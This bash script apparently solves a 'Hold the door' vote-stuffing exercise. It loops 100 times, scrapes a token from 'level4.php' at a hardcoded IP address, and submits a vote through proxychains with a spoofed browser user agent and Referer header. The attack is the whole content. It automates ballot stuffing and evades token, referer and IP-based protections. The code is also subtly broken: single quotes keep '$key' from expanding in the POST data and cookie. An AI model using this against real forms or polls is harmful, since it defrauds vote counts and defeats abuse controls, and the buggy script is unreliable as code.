#!/bin/bash
for i in $(seq 1 100); do
key=$(curl -X POST http://158.69.76.135/level4.php -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66" -H "Referer: http://158.69.76.135/level4.php" | grep -oE '\w{25,}')
proxychains curl -s -X POST http://158.69.76.135/level4.php -d 'id=2187&holdthedoor=submit&key=$key' -vvv -b 'HoldTheDoor=$key' -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66" -H "Referer: http://158.69.76.135/level4.php" | head
done
